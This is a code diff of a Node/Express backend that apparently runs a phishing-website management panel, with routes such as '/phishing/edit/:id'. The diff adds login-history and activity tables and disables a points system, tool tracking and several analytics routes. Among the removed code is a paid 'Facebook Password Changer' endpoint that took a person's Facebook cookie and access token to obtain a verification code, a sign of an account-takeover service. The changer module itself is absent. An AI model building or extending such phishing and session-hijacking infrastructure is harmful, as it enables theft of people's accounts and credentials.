@@ -398,12 +398,8 @@ app.get('/phishing/edit/:id', authenticateUser, async (req, res) => {
             
             <div class="form-group">
                 <label for="language">Language</label>
-                <select id="language" name="language">
-                    <option value="en" ${website.language === 'en' ? 'selected' : ''}>English</option>
-                    <option value="vi" ${website.language === 'vi' ? 'selected' : ''}>Vietnamese</option>
-                    <option value="es" ${website.language === 'es' ? 'selected' : ''}>Spanish</option>
-                    <option value="fr" ${website.language === 'fr' ? 'selected' : ''}>French</option>
-                </select>
+                <input type="hidden" id="language" name="language" value="vi">
+                <input type="text" value="Vietnamese" disabled>
             </div>
             
             <div style="margin-top: 30px;">
@@ -1084,6 +1080,68 @@ const ensureTemplatesTables = async () => {
   }
 };
 
+// Ensure login_history table exists
+const ensureLoginHistoryTable = async () => {
+  try {
+    console.log('🔧 Ensuring login_history table structure...');
+    const createTableSQL = `
+      CREATE TABLE IF NOT EXISTS login_history (
+        id INT AUTO_INCREMENT PRIMARY KEY,
+        user_id INT NOT NULL,
+        ip_address VARCHAR(45) NOT NULL,
+        user_agent TEXT,
+        device_type VARCHAR(50),
+        browser VARCHAR(100),
+        os VARCHAR(100),
+        location VARCHAR(255),
+        is_successful BOOLEAN DEFAULT TRUE,
+        session_token VARCHAR(500),
+        is_active BOOLEAN DEFAULT TRUE,
+        logged_out_at TIMESTAMP NULL,
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+        FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
+        INDEX idx_user_id (user_id),
+        INDEX idx_ip_address (ip_address),
+        INDEX idx_is_active (is_active),
+        INDEX idx_created_at (created_at)
+      ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
+    `;
+    await executeQuery(createTableSQL);
+    console.log('✅ login_history table ensured');
+  } catch (error) {
+    console.error('❌ Error ensuring login_history table:', error);
+  }
+};
+
+// Ensure activities table exists
+const ensureActivitiesTable = async () => {
+  try {
+    console.log('🔧 Ensuring activities table structure...');
+    const createTableSQL = `
+      CREATE TABLE IF NOT EXISTS activities (
+        id INT AUTO_INCREMENT PRIMARY KEY,
+        user_id INT NOT NULL,
+        username VARCHAR(255),
+        type VARCHAR(50),
+        action VARCHAR(255),
+        description TEXT,
+        metadata TEXT,
+        ip_address VARCHAR(45),
+        user_agent TEXT,
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+        FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
+        INDEX idx_user_id (user_id),
+        INDEX idx_type (type),
+        INDEX idx_created_at (created_at)
+      ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
+    `;
+    await executeQuery(createTableSQL);
+    console.log('✅ activities table ensured');
+  } catch (error) {
+    console.error('❌ Error ensuring activities table:', error);
+  }
+};
+
 // Initialize table - make sure it completes
 (async () => {
   try {
@@ -1110,6 +1168,14 @@ const ensureTemplatesTables = async () => {
     console.log('🚀 Starting domains tables initialization...');
     await ensureDomainsTables();
     console.log('✅ Domains tables initialization completed');
+    
+    console.log('🚀 Starting login_history table initialization...');
+    await ensureLoginHistoryTable();
+    console.log('✅ login_history table initialization completed');
+    
+    console.log('🚀 Starting activities table initialization...');
+    await ensureActivitiesTable();
+    console.log('✅ activities table initialization completed');
 
   } catch (error) {
     console.error('❌ Failed to initialize tables:', error);
@@ -2748,57 +2814,12 @@ app.get('/api/dashboard/analytics', authenticateToken, async (req, res) => {
   }
 });
 
-// Get user points transaction history
+// Get user points transaction history - Disabled
 app.get('/api/user/points-history', authenticateToken, async (req, res) => {
-  try {
-    const userId = req.user.id;
-    const { page = 1, limit = 20 } = req.query;
-    const offset = (page - 1) * limit;
-
-    // Get points transaction history
-    const transactionsResult = await executeQuery(`
-      SELECT 
-        id,
-        points_change,
-        reason,
-        reference_type,
-        created_at,
-        CASE 
-          WHEN points_change > 0 THEN 'earned'
-          ELSE 'spent'
-        END as transaction_type
-      FROM user_points_transactions 
-      WHERE user_id = ?
-      ORDER BY created_at DESC
-      LIMIT ${parseInt(limit)} OFFSET ${parseInt(offset)}
-    `, [userId]);
-
-    // Get total count for pagination
-    const countResult = await executeQuery(
-      'SELECT COUNT(*) as total FROM user_points_transactions WHERE user_id = ?',
-      [userId]
-    );
-
-    const totalTransactions = countResult.success ? countResult.data[0].total : 0;
-    const totalPages = Math.ceil(totalTransactions / limit);
-
-    res.json({
-      status: 'success',
-      data: {
-        transactions: transactionsResult.success ? transactionsResult.data : [],
-        pagination: {
-          currentPage: parseInt(page),
-          totalPages: totalPages,
-          totalTransactions: totalTransactions,
-          hasNextPage: page < totalPages,
-          hasPrevPage: page > 1
-        }
-      }
-    });
-  } catch (error) {
-    console.error('Points history error:', error);
-    res.status(500).json({ status: 'error', message: error.message });
-  }
+  res.status(404).json({
+    status: 'error',
+    message: 'Points feature has been disabled'
+  });
 });
 
 // Helper function to get time ago string
@@ -2841,206 +2862,28 @@ const getIconFilePath = (icon) => {
   return null;
 };
 
-// Track tool usage endpoint
+// Track tool usage endpoint - Disabled
 app.post('/api/tools/:toolId/track-usage', async (req, res) => {
-  try {
-    const { toolId } = req.params;
-    const { userId } = req.body;
-
-    console.log(`📊 Tracking usage for tool ${toolId} by user ${userId}`);
-
-    // First, find the tool by ID or URL
-    const findToolResult = await executeQuery(`
-      SELECT id, name, url FROM tools 
-      WHERE id = ? OR url LIKE ? OR name LIKE ?
-    `, [toolId, `%${toolId}%`, `%${toolId}%`]);
-
-    if (!findToolResult.success || findToolResult.data.length === 0) {
-      console.log(`❌ Tool not found: ${toolId}`);
-      return res.status(404).json({
-        status: 'error',
-        message: 'Tool not found'
-      });
-    }
-
-    const tool = findToolResult.data[0];
-    console.log(`✅ Found tool: ${tool.name} (ID: ${tool.id})`);
-
-    // Update usage count in tools table
-    const updateResult = await executeQuery(`
-      UPDATE tools 
-      SET usage_count = usage_count + 1, updated_at = NOW()
-      WHERE id = ?
-    `, [tool.id]);
-
-    if (updateResult.success) {
-      console.log(`✅ Updated usage count for tool ${tool.id}`);
-
-      // Also track in tool_usage table if user is provided
-      if (userId) {
-        const toolUsageResult = await executeQuery(`
-          INSERT INTO tool_usage (user_id, tool_id, used_at, session_duration, success, notes)
-          VALUES (?, ?, NOW(), 0, true, 'Tool viewed')
-        `, [userId, tool.id]);
-
-        console.log(`✅ Tool usage tracked: ${toolUsageResult.success ? 'Success' : 'Failed'}`);
-      }
-
-      res.json({
-        status: 'success',
-        message: 'Tool usage tracked successfully',
-        toolId: tool.id,
-        toolName: tool.name
-      });
-    } else {
-      console.log(`❌ Failed to update usage count: ${updateResult.error}`);
-      res.status(500).json({
-        status: 'error',
-        message: 'Failed to track tool usage',
-        error: updateResult.error
-      });
-    }
-  } catch (error) {
-    console.error('❌ Track tool usage error:', error);
-    res.status(500).json({
-      status: 'error',
-      message: 'Failed to track tool usage',
-      error: error.message
-    });
-  }
+  res.status(404).json({
+    status: 'error',
+    message: 'Tools feature has been disabled'
+  });
 });
 
-// Track tool view endpoint
+// Track tool view endpoint - Disabled
 app.post('/api/tools/:toolId/track-view', async (req, res) => {
-  try {
-    const { toolId } = req.params;
-
-    console.log(`👁️ Tracking view for tool ${toolId}`);
-
-    // Update usage_count for the tool
-    const updateResult = await executeQuery(`
-      UPDATE tools 
-      SET usage_count = usage_count + 1, updated_at = CURRENT_TIMESTAMP
-      WHERE id = ?
-    `, [toolId]);
-
-    if (updateResult.success) {
-      console.log(`✅ Successfully tracked view for tool ${toolId}`);
-      res.json({
-        status: 'success',
-        message: 'View tracked successfully'
-      });
-    } else {
-      console.log('❌ Failed to track view:', updateResult.error);
-      res.status(500).json({
-        status: 'error',
-        message: 'Failed to track view',
-        error: updateResult.error
-      });
-    }
-  } catch (error) {
-    console.error('❌ Track view error:', error);
-    res.status(500).json({
-      status: 'error',
-      message: 'Failed to track view',
-      error: error.message
-    });
-  }
+  res.status(404).json({
+    status: 'error',
+    message: 'Tools feature has been disabled'
+  });
 });
 
-// Public tools endpoint
+// Tools endpoint removed
 app.get('/api/tools', async (req, res) => {
-  try {
-    console.log('🔧 Fetching tools from database...');
-    const { category } = req.query;
-
-    // First check if tools table exists
-    const tableCheck = await executeQuery(`SHOW TABLES LIKE 'tools'`);
-    if (!tableCheck.success || tableCheck.data.length === 0) {
-      console.log('❌ Tools table does not exist, creating it...');
-
-      // Create tools table
-      const createTable = await executeQuery(`
-        CREATE TABLE IF NOT EXISTS tools (
-          id INT AUTO_INCREMENT PRIMARY KEY,
-          name VARCHAR(100) NOT NULL,
-          description TEXT,
-          category ENUM('seo', 'development', 'design', 'analytics', 'productivity', 'other') DEFAULT 'other',
-          status ENUM('active', 'inactive', 'maintenance') DEFAULT 'active',
-          price DECIMAL(10,2) DEFAULT 0.00,
-          points_cost INT DEFAULT 0,
-          icon VARCHAR(10) DEFAULT '🔧',
-          url VARCHAR(255),
-          is_featured BOOLEAN DEFAULT FALSE,
-          usage_count INT DEFAULT 0,
-          created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-          updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
-          
-          INDEX idx_category (category),
-          INDEX idx_status (status),
-          INDEX idx_is_featured (is_featured),
-          INDEX idx_usage_count (usage_count),
-          UNIQUE KEY unique_tool_name (name)
-        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
-      `);
-
-      if (!createTable.success) {
-        return res.status(500).json({
-          status: 'error',
-          message: 'Failed to create tools table',
-          error: createTable.error
-        });
-      }
-
-      // Insert sample tools data
-      await executeQuery(`
-        INSERT IGNORE INTO tools (name, description, category, status, price, points_cost, icon, url, is_featured, usage_count) VALUES
-        ('SEO Analyzer', 'Analyze your website SEO performance and get detailed recommendations', 'seo', 'active', 9.99, 100, '🔍', '/tools/seo-analyzer', TRUE, 1250),
-        ('Code Generator', 'Generate code snippets for various programming languages', 'development', 'active', 19.99, 200, '💻', '/tools/code-generator', FALSE, 890),
-        ('Image Optimizer', 'Optimize images for web performance without losing quality', 'design', 'active', 14.99, 150, '🖼️', '/tools/image-optimizer', TRUE, 2100),
-        ('Text Summarizer', 'Summarize long texts automatically using AI', 'productivity', 'active', 7.99, 80, '📝', '/tools/text-summarizer', FALSE, 650),
-        ('Analytics Dashboard', 'Create beautiful analytics dashboards with real-time data', 'analytics', 'active', 24.99, 250, '📊', '/tools/analytics-dashboard', TRUE, 420),
-        ('Color Palette Generator', 'Generate harmonious color palettes for your designs', 'design', 'active', 5.99, 60, '🎨', '/tools/color-palette', FALSE, 320),
-        ('Password Generator', 'Generate secure passwords with customizable options', 'productivity', 'active', 2.99, 30, '🔐', '/tools/password-generator', FALSE, 1800),
-        ('QR Code Generator', 'Create QR codes for URLs, text, and contact information', 'productivity', 'active', 3.99, 40, '📱', '/tools/qr-generator', FALSE, 750)
-      `);
-
-      console.log('✅ Tools table created and sample data inserted');
-    }
-
-    const whereClause = category ? 'status = \'active\' AND category = ?' : "status = 'active'";
-    const params = category ? [category] : [];
-
-    const result = await executeQuery(
-      `SELECT id, name, description, category, status, price, points_cost, icon, url, is_featured, usage_count
-       FROM tools
-       WHERE ${whereClause}
-       ORDER BY is_featured DESC, usage_count DESC, name ASC`,
-      params
-    );
-
-    if (result.success) {
-      console.log(`✅ Successfully fetched ${result.data.length} tools`);
-      res.json({
-        status: 'success',
-        data: result.data
-      });
-    } else {
-      console.log('❌ Failed to fetch tools:', result.error);
-      res.status(500).json({
-        status: 'error',
-        message: 'Failed to fetch tools',
-        error: result.error
-      });
-    }
-  } catch (error) {
-    console.error('❌ Fetch tools error:', error);
-    res.status(500).json({
-      status: 'error',
-      message: 'Failed to fetch tools',
-      error: error.message
-    });
-  }
+  res.status(404).json({
+    status: 'error',
+    message: 'Tools feature has been disabled'
+  });
 });
 
 // =====================================================
@@ -3167,80 +3010,12 @@ app.put('/api/admin/system-announcement', authenticateAdmin, async (req, res) =>
   }
 });
 
-// Admin user points transactions management
+// Admin user points transactions management - Disabled
 app.get('/api/admin/user-points', authenticateAdmin, async (req, res) => {
-  try {
-    const { page = 1, limit = 10, search = '', type = 'all', user_id = 'all' } = req.query;
-    const offset = (page - 1) * limit;
-
-    let whereClause = '1=1';
-    const params = [];
-
-    if (search) {
-      whereClause += ' AND (description LIKE ? OR transaction_id LIKE ?)';
-      params.push(`%${search}%`, `%${search}%`);
-    }
-
-    if (type !== 'all') {
-      whereClause += ' AND type = ?';
-      params.push(type);
-    }
-
-    if (user_id !== 'all') {
-      whereClause += ' AND user_id = ?';
-      params.push(user_id);
-    }
-
-    const countResult = await executeQuery(
-      `SELECT COUNT(*) as total FROM user_points_transactions WHERE ${whereClause}`,
-      params
-    );
-
-    const dataResult = await executeQuery(`
-      SELECT 
-        upt.*,
-        u.username,
-        u.email
-      FROM user_points_transactions upt
-      LEFT JOIN users u ON upt.user_id = u.id
-      WHERE ${whereClause}
-      ORDER BY upt.created_at DESC
-      LIMIT ${parseInt(limit)} OFFSET ${parseInt(offset)}
-    `, params);
-
-    if (countResult.success && dataResult.success) {
-      const total = countResult.data[0].total;
-      const totalPages = Math.ceil(total / limit);
-
-      res.json({
-        status: 'success',
-        data: {
-          transactions: dataResult.data,
-          pagination: {
-            page: parseInt(page),
-            limit: parseInt(limit),
-            total,
-            totalPages,
-            hasNext: page < totalPages,
-            hasPrev: page > 1
-          }
-        }
-      });
-    } else {
-      res.status(500).json({
-        status: 'error',
-        message: 'Failed to fetch user points transactions',
-        error: countResult.error || dataResult.error
-      });
-    }
-  } catch (error) {
-    console.error('Get user points transactions error:', error);
-    res.status(500).json({
-      status: 'error',
-      message: 'Failed to fetch user points transactions',
-      error: error.message
-    });
-  }
+  res.status(404).json({
+    status: 'error',
+    message: 'Points feature has been disabled'
+  });
 });
 
 // Admin user analytics management
@@ -3378,7 +3153,7 @@ app.post('/api/analytics/track-login', authenticateToken, async (req, res) => {
   }
 });
 
-// Track registration and award points
+// Track registration (Points disabled)
 app.post('/api/analytics/track-registration', async (req, res) => {
   try {
     const { userId } = req.body;
@@ -3390,31 +3165,18 @@ app.post('/api/analytics/track-registration', async (req, res) => {
       });
     }
 
-    // Award 100 points for registration
-    const pointsResult = await executeQuery(
-      'INSERT INTO user_points_transactions (user_id, type, points, description) VALUES (?, "registration_bonus", 100, "Welcome bonus for new registration")',
+    // Initialize user analytics only (no points)
+    await executeQuery(
+      'INSERT INTO user_analytics (user_id, last_activity) VALUES (?, NOW())',
       [userId]
     );
 
-    if (pointsResult.success) {
-      // Initialize user analytics
-      await executeQuery(
-        'INSERT INTO user_analytics (user_id, last_activity) VALUES (?, NOW())',
-        [userId]
-      );
+    res.json({
+      status: 'success',
+      message: 'Registration tracked',
+      pointsAwarded: 0
+    });
 
-      res.json({
-        status: 'success',
-        message: 'Registration tracked and points awarded',
-        pointsAwarded: 100
-      });
-    } else {
-      res.status(500).json({
-        status: 'error',
-        message: 'Failed to award registration points',
-        error: pointsResult.error
-      });
-    }
   } catch (error) {
     console.error('Track registration error:', error);
     res.status(500).json({
@@ -3425,189 +3187,36 @@ app.post('/api/analytics/track-registration', async (req, res) => {
   }
 });
 
-// Track tool usage
+// Track tool usage - Disabled
 app.post('/api/analytics/track-tool-usage', authenticateToken, async (req, res) => {
-  try {
-    const { toolId, duration = 0, success = true, notes = '' } = req.body;
-    const userId = req.user.id;
-
-    if (!toolId) {
-      return res.status(400).json({
-        status: 'error',
-        message: 'Tool ID is required'
-      });
-    }
-
-    // Insert tool usage record
-    const result = await executeQuery(
-      'INSERT INTO tool_usage (user_id, tool_id, used_at, session_duration, success, notes) VALUES (?, ?, NOW(), ?, ?, ?)',
-      [userId, toolId, duration, success, notes]
-    );
-
-    if (result.success) {
-      // Update user analytics
-      await executeQuery(
-        'INSERT INTO user_analytics (user_id, tool_use_count, last_activity) VALUES (?, 1, NOW()) ON DUPLICATE KEY UPDATE tool_use_count = tool_use_count + 1, last_activity = NOW()',
-        [userId]
-      );
-
-      res.json({
-        status: 'success',
-        message: 'Tool usage tracked successfully'
-      });
-    } else {
-      res.status(500).json({
-        status: 'error',
-        message: 'Failed to track tool usage',
-        error: result.error
-      });
-    }
-  } catch (error) {
-    console.error('Track tool usage error:', error);
-    res.status(500).json({
-      status: 'error',
-      message: 'Failed to track tool usage',
-      error: error.message
-    });
-  }
+  res.status(404).json({
+    status: 'error',
+    message: 'Tools feature has been disabled'
+  });
 });
 
-// Test endpoint for tool usage (no auth required for testing)
+// Test endpoint for tool usage - Disabled
 app.get('/api/test/tool-usage', async (req, res) => {
-  try {
-    console.log('Tool usage test endpoint called');
-
-    // Test database connection
-    const testResult = await executeQuery('SELECT COUNT(*) as count FROM tool_usage');
-    console.log('Tool usage table count:', testResult);
-
-    // Test if we can query the table
-    const sampleResult = await executeQuery('SELECT * FROM tool_usage LIMIT 5');
-    console.log('Sample tool usage data:', sampleResult);
-
-    res.json({
-      status: 'success',
-      message: 'Tool usage test endpoint working',
-      data: {
-        tableExists: testResult.success,
-        count: testResult.success ? testResult.data[0].count : 0,
-        sampleData: sampleResult.success ? sampleResult.data : []
-      }
-    });
-  } catch (error) {
-    console.error('Tool usage test error:', error);
-    res.status(500).json({
-      status: 'error',
-      message: 'Tool usage test failed',
-      error: error.message
-    });
-  }
+  res.status(404).json({
+    status: 'error',
+    message: 'Tools feature has been disabled'
+  });
 });
 
-// Test endpoint for tool usage
+// Test endpoint for tool usage - Disabled
 app.get('/api/admin/tool-usage-test', authenticateAdmin, async (req, res) => {
-  try {
-    console.log('Tool usage test endpoint called');
-
-    // Test database connection
-    const testResult = await executeQuery('SELECT COUNT(*) as count FROM tool_usage');
-    console.log('Tool usage table count:', testResult);
-
-    res.json({
-      status: 'success',
-      message: 'Tool usage test endpoint working',
-      data: {
-        tableExists: testResult.success,
-        count: testResult.success ? testResult.data[0].count : 0
-      }
-    });
-  } catch (error) {
-    console.error('Tool usage test error:', error);
-    res.status(500).json({
-      status: 'error',
-      message: 'Tool usage test failed',
-      error: error.message
-    });
-  }
+  res.status(404).json({
+    status: 'error',
+    message: 'Tools feature has been disabled'
+  });
 });
 
-// Admin tool usage management
+// Admin tool usage management - Disabled
 app.get('/api/admin/tool-usage', authenticateAdmin, async (req, res) => {
-  try {
-    const { page = 1, limit = 10, search = '', tool_id = 'all', user_id = 'all' } = req.query;
-    const offset = (page - 1) * limit;
-
-    let whereClause = '1=1';
-    const params = [];
-
-    if (search) {
-      whereClause += ' AND (t.name LIKE ? OR u.username LIKE ?)';
-      params.push(`%${search}%`, `%${search}%`);
-    }
-
-    if (tool_id !== 'all') {
-      whereClause += ' AND tu.tool_id = ?';
-      params.push(tool_id);
-    }
-
-    if (user_id !== 'all') {
-      whereClause += ' AND tu.user_id = ?';
-      params.push(user_id);
-    }
-
-    const countResult = await executeQuery(
-      `SELECT COUNT(*) as total FROM tool_usage tu LEFT JOIN tools t ON tu.tool_id = t.id LEFT JOIN users u ON tu.user_id = u.id WHERE ${whereClause}`,
-      params
-    );
-
-    const dataResult = await executeQuery(`
-      SELECT 
-        tu.*,
-        t.name as tool_name,
-        t.icon as tool_icon,
-        u.username,
-        u.email
-      FROM tool_usage tu
-      LEFT JOIN tools t ON tu.tool_id = t.id
-      LEFT JOIN users u ON tu.user_id = u.id
-      WHERE ${whereClause}
-      ORDER BY tu.used_at DESC
-      LIMIT ${parseInt(limit)} OFFSET ${parseInt(offset)}
-    `, params);
-
-    if (countResult.success && dataResult.success) {
-      const total = countResult.data[0].total;
-      const totalPages = Math.ceil(total / limit);
-
-      res.json({
-        status: 'success',
-        data: {
-          usage: dataResult.data,
-          pagination: {
-            page: parseInt(page),
-            limit: parseInt(limit),
-            total,
-            totalPages,
-            hasNext: page < totalPages,
-            hasPrev: page > 1
-          }
-        }
-      });
-    } else {
-      res.status(500).json({
-        status: 'error',
-        message: 'Failed to fetch tool usage',
-        error: countResult.error || dataResult.error
-      });
-    }
-  } catch (error) {
-    console.error('Get tool usage error:', error);
-    res.status(500).json({
-      status: 'error',
-      message: 'Failed to fetch tool usage',
-      error: error.message
-    });
-  }
+  res.status(404).json({
+    status: 'error',
+    message: 'Tools feature has been disabled'
+  });
 });
 
 // Admin user balance transactions management
@@ -3617,48 +3226,13 @@ app.get('/api/admin/analytics', authenticateAdmin, async (req, res) => {
     // Get overall statistics
     const statsPromises = [
       executeQuery('SELECT COUNT(*) as total_users FROM users'),
-      executeQuery('SELECT COUNT(*) as total_tools FROM tools'),
-      executeQuery('SELECT COUNT(*) as total_usage FROM tool_usage'),
-      executeQuery('SELECT SUM(points) as total_points FROM user_points_transactions WHERE type = "earned"'),
-      executeQuery('SELECT COUNT(*) as active_users FROM user_analytics WHERE last_activity > DATE_SUB(NOW(), INTERVAL 7 DAY)'),
+      executeQuery('SELECT COUNT(*) as active_users FROM users WHERE is_active = TRUE'),
     ];
 
     const [
       usersResult,
-      toolsResult,
-      usageResult,
-      pointsResult,
       activeUsersResult,
     ] = await Promise.all(statsPromises);
-
-    // Get recent activity
-    const recentActivityResult = await executeQuery(`
-      SELECT 
-        'tool_usage' as type,
-        tu.used_at as created_at,
-        CONCAT(u.username, ' used ', t.name) as description,
-        u.username,
-        t.name as tool_name
-      FROM tool_usage tu
-      LEFT JOIN users u ON tu.user_id = u.id
-      LEFT JOIN tools t ON tu.tool_id = t.id
-      ORDER BY tu.used_at DESC
-      LIMIT 10
-    `);
-
-    // Get top tools by usage
-    const topToolsResult = await executeQuery(`
-      SELECT 
-        t.name,
-        t.icon,
-        COUNT(tu.id) as usage_count,
-        COUNT(DISTINCT tu.user_id) as unique_users
-      FROM tools t
-      LEFT JOIN tool_usage tu ON t.id = tu.tool_id
-      GROUP BY t.id, t.name, t.icon
-      ORDER BY usage_count DESC
-      LIMIT 10
-    `);
 
     // Get user growth over time
     const userGrowthResult = await executeQuery(`
@@ -3676,9 +3250,9 @@ app.get('/api/admin/analytics', authenticateAdmin, async (req, res) => {
       data: {
         stats: {
           total_users: usersResult.success ? usersResult.data[0].total_users : 0,
-          total_tools: toolsResult.success ? toolsResult.data[0].total_tools : 0,
-          total_usage: usageResult.success ? usageResult.data[0].total_usage : 0,
-          total_points: pointsResult.success ? pointsResult.data[0].total_points : 0,
+          total_tools: 0,
+          total_usage: 0,
+          total_points: 0,
           total_balance: 0,
           active_users: activeUsersResult.success ? activeUsersResult.data[0].active_users : 0,
           total_transactions: 0,
@@ -3686,8 +3260,8 @@ app.get('/api/admin/analytics', authenticateAdmin, async (req, res) => {
           deposits_today: 0,
           admin_adjustments_today: 0
         },
-        recent_activity: recentActivityResult.success ? recentActivityResult.data : [],
-        top_tools: topToolsResult.success ? topToolsResult.data : [],
+        recent_activity: [],
+        top_tools: [],
         user_growth: userGrowthResult.success ? userGrowthResult.data : [],
         recent_transactions: [],
         transaction_types: [],
@@ -3870,300 +3444,65 @@ app.get('/api/users', async (req, res) => {
   }
 });
 
-// Facebook Password Changer API endpoints
+// Facebook Password Changer API endpoints - Disabled
 app.post('/api/tools/change-pass/track-usage', async (req, res) => {
-  try {
-    const { userId } = req.body;
-
-    console.log(`📊 Tracking usage for change-pass tool by user ${userId}`);
-
-    // Find the change-pass tool
-    const findToolResult = await executeQuery(`
-      SELECT id, name, url FROM tools 
-      WHERE url LIKE '%change-pass%' OR name LIKE '%change-pass%'
-    `);
-
-    if (!findToolResult.success || findToolResult.data.length === 0) {
-      console.log(`❌ Change-pass tool not found`);
-      return res.status(404).json({
-        status: 'error',
-        message: 'Change-pass tool not found'
-      });
-    }
-
-    const tool = findToolResult.data[0];
-    console.log(`✅ Found change-pass tool: ${tool.name} (ID: ${tool.id})`);
-
-    // Update usage count in tools table
-    const updateResult = await executeQuery(`
-      UPDATE tools 
-      SET usage_count = usage_count + 1, updated_at = NOW()
-      WHERE id = ?
-    `, [tool.id]);
-
-    if (!updateResult.success) {
-      console.log(`❌ Failed to update usage count for tool ${tool.id}`);
-      return res.status(500).json({
-        status: 'error',
-        message: 'Failed to update usage count'
-      });
-    }
-
-    // Log the usage in tool_usage_logs table
-    const logResult = await executeQuery(`
-      INSERT INTO tool_usage_logs (tool_id, user_id, action, created_at)
-      VALUES (?, ?, 'view', NOW())
-    `, [tool.id, userId]);
-
-    if (!logResult.success) {
-      console.log(`⚠️ Failed to log usage for tool ${tool.id}, but usage count was updated`);
-    }
-
-    console.log(`✅ Successfully tracked usage for change-pass tool`);
-
-    res.json({
-      status: 'success',
-      message: 'Usage tracked successfully',
-      data: {
-        tool_id: tool.id,
-        tool_name: tool.name,
-        usage_count: tool.usage_count + 1
-      }
-    });
-
-  } catch (error) {
-    console.error('❌ Error tracking change-pass tool usage:', error);
-    res.status(500).json({
-      status: 'error',
-      message: 'Internal server error',
-      error: error.message
-    });
-  }
+  res.status(404).json({
+    status: 'error',
+    message: 'Tools feature has been disabled'
+  });
 });
 
+// Change-pass get code - Disabled
 app.post('/api/tools/change-pass/get-code', authenticateToken, async (req, res) => {
-  try {
-    const { cookie, access_token, payment_method = 'points' } = req.body;
-    const userId = req.user.id;
-
-    if (!cookie || !access_token) {
-      return res.status(400).json({
-        status: 'error',
-        message: 'Cookie and access token are required'
-      });
-    }
-
-    // Find the change-pass tool
-    const toolResult = await executeQuery(`
-      SELECT id, name, points_cost, price FROM tools 
-      WHERE url LIKE '%change-pass%' OR name LIKE '%change-pass%'
-    `);
-
-    if (!toolResult.success || toolResult.data.length === 0) {
-      return res.status(404).json({
-        status: 'error',
-        message: 'Change-pass tool not found'
-      });
-    }
-
-    const tool = toolResult.data[0];
-
-    // Check if user has enough points/balance
-    const userResult = await executeQuery(`
-      SELECT points, balance FROM users WHERE id = ?
-    `, [userId]);
-
-    if (!userResult.success || userResult.data.length === 0) {
-      return res.status(400).json({
-        status: 'error',
-        message: 'User not found'
-      });
-    }
-
-    const user = userResult.data[0];
-
-    // Check payment method and validate accordingly
-    // Priority: 1. Money (balance), 2. Points
-    if (payment_method === 'money') {
-      if (parseFloat(user.balance) < parseFloat(tool.price)) {
-        // If balance insufficient, check if user has enough points as fallback
-        if (user.points < tool.points_cost) {
-          return res.status(400).json({
-            status: 'error',
-            message: `Insufficient balance and points. Required: $${tool.price} or ${tool.points_cost} points. Available: $${user.balance}, ${user.points} points`
-          });
-        }
-        // Update to use points instead
-        req.body.payment_method = 'points';
-      }
-    } else if (payment_method === 'points') {
-      if (user.points < tool.points_cost) {
-        // If points insufficient, check if user has enough balance as fallback
-        if (parseFloat(user.balance) < parseFloat(tool.price)) {
-          return res.status(400).json({
-            status: 'error',
-            message: `Insufficient points and balance. Required: ${tool.points_cost} points or $${tool.price}. Available: ${user.points} points, $${user.balance}`
-          });
-        }
-        // Update to use balance instead
-        req.body.payment_method = 'money';
-      }
-    }
-
-    // Use local Facebook password changer implementation
-    console.log('=== LOCAL FACEBOOK PASSWORD CHANGER (GET-CODE) ===');
-    console.log('Using local implementation instead of external API');
-
-    let data;
-    try {
-      // const changer = new FacebookPasswordChanger(cookie, access_token);
-      // const code = await changer.getCode();
-
-      data = {
-        success: false,
-        code: null,
-        message: 'Facebook password changer not available',
-        logs: ['Facebook password changer module not found']
-      };
-
-      // console.log('Code retrieved successfully:', { code_length: code.length });
-    } catch (error) {
-      console.error('Local implementation error:', error);
-      data = {
-        success: false,
-        message: error.message,
-        logs: []
-      };
-    }
-
-    if (data.success) {
-      // Deduct points/balance from user based on payment method
-      if (payment_method === 'points') {
-        await executeQuery(`
-          UPDATE users 
-          SET points = points - ?, updated_at = NOW()
-          WHERE id = ?
-        `, [tool.points_cost, userId]);
-
-        // Record the points transaction
-        await executeQuery(`
-          INSERT INTO user_points_transactions (user_id, points_change, reason, reference_type, reference_id)
-          VALUES (?, ?, ?, 'tool_usage', ?)
-        `, [userId, -tool.points_cost, `Used ${tool.name} - Get Code`, tool.id]);
-      } else if (payment_method === 'money') {
-        await executeQuery(`
-          UPDATE users 
-          SET balance = balance - ?, updated_at = NOW()
-          WHERE id = ?
-        `, [tool.price, userId]);
-
-        // Record the money transaction
-        await executeQuery(`
-          INSERT INTO transaction_history (user_id, transaction_type, amount, balance_before, balance_after, description, reference_id)
-          VALUES (?, 'product_purchase', ?, ?, ?, ?, ?)
-        `, [userId, -parseFloat(tool.price), parseFloat(user.balance), parseFloat(user.balance) - parseFloat(tool.price), `Used ${tool.name} - Get Code`, tool.id]);
-      }
-
-      // Track tool usage
-      await executeQuery(`
-        INSERT INTO tool_usage (user_id, tool_id, used_at, session_duration, success, notes)
-        VALUES (?, ?, NOW(), 0, true, 'Get verification code')
-      `, [userId, tool.id]);
-
-      // Update tool usage count
-      await executeQuery(`
-        UPDATE tools 
-        SET usage_count = usage_count + 1, updated_at = NOW()
-        WHERE id = ?
-      `, [tool.id]);
-
-      res.json({
-        status: 'success',
-        code: data.code,
-        message: 'Verification code obtained successfully',
-        points_deducted: tool.points_cost,
-        remaining_points: payment_method === 'points' ? user.points - tool.points_cost : user.points,
-        payment_method_used: payment_method,
-        amount_deducted: payment_method === 'points' ? `${tool.points_cost} points` : `$${tool.price}`,
-        logs: data.logs || []
-      });
-    } else {
-      res.status(400).json({
-        status: 'error',
-        message: data.message || 'Failed to get verification code'
-      });
-    }
-  } catch (error) {
-    console.error('Get code error:', error);
-
-    // Provide more specific error messages based on error type
-    let errorMessage = 'Internal server error';
-    let statusCode = 500;
-
-    if (error.message.includes('API request failed')) {
-      errorMessage = 'External API is currently unavailable. Please try again later.';
-      statusCode = 503; // Service Unavailable
-    } else if (error.message.includes('HTML error page')) {
-      errorMessage = 'External API returned an error page. The service may be temporarily down.';
-      statusCode = 503;
-    } else if (error.message.includes('not valid JSON')) {
